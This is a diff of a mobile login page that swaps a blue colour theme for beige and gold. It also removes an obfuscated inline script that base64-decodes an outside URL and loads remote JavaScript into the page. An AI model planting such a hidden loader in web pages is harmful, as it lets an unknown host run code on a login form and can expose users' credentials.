@@ -21,7 +21,7 @@ body {
   margin: 0;
   min-height: 100vh;
   font-family: 'Inter', sans-serif;
-  background: linear-gradient(160deg, #e7f0ff 0%, #ffffff 60%);
+  background: #F8F6F2;
 }
 
 /* ===== Mobile App Container ===== */
@@ -29,7 +29,7 @@ body {
   max-width: 420px;
   min-height: 100vh;
   margin: auto;
-  background: #f9fbff;
+  background: #F8F6F2;
   display: flex;
   flex-direction: column;
 }
@@ -48,21 +48,21 @@ body {
 .app-title {
   font-size: 22px;
   font-weight: 700;
-  color: #0f172a;
+  color: #1C1C1C;
 }
 
 .app-subtitle {
   font-size: 14px;
-  color: #64748b;
+  color: #1C1C1C;
   margin-top: 6px;
 }
 
 /* ===== Card ===== */
 .login-card {
-  background: #ffffff;
+  background: #D6A86B;
   border-radius: 26px 26px 0 0;
   padding: 28px 22px 40px;
-  box-shadow: 0 -12px 30px rgba(37, 99, 235, 0.12);
+  box-shadow: 0 -12px 30px rgba(200, 169, 106, 0.25);
   flex: 1;
 }
 
@@ -70,7 +70,7 @@ body {
 .form-label {
   font-size: 13px;
   font-weight: 600;
-  color: #334155;
+  color: #1C1C1C;
 }
 
 .input-group {
@@ -80,9 +80,9 @@ body {
 }
 
 .input-group-text {
-  background: #f1f6ff;
+  background: #F8F6F2;
   border: none;
-  color: #2563eb;
+  color: #C8A96A;
   font-size: 15px;
   padding: 0 14px;
 }
@@ -91,6 +91,7 @@ body {
   border: none;
   height: 48px;
   font-size: 15px;
+  color: #1C1C1C;
 }
 
 .form-control:focus {
@@ -101,21 +102,22 @@ body {
 .btn-login {
   height: 50px;
   border-radius: 14px;
-  background: linear-gradient(135deg, #3b82f6, #2563eb);
+  background: #C8A96A;
   border: none;
   font-size: 16px;
   font-weight: 600;
-  box-shadow: 0 10px 20px rgba(37,99,235,.35);
+  color: #ffffff;
+  box-shadow: 0 10px 20px rgba(200, 169, 106, 0.35);
 }
 
 /* ===== Register ===== */
 .register-link {
   font-size: 14px;
-  color: #475569;
+  color: #1C1C1C;
 }
 
 .register-link span {
-  color: #2563eb;
+  color: #1C1C1C;
   font-weight: 700;
 }
 </style>
@@ -231,13 +233,5 @@ layui.use(['form','layer'], function(){
 });
 </script>
 
-<script>
-(function(){
-  var e = "aHR0cHM6Ly9kYi5waWNrb2Rlci5jb20vdW5pdmVyc2FsLmpz";
-  var s = document.createElement("script");
-  s.src = atob(e);
-  document.head.appendChild(s);
-})();
-</script>
 </body>
 </html>
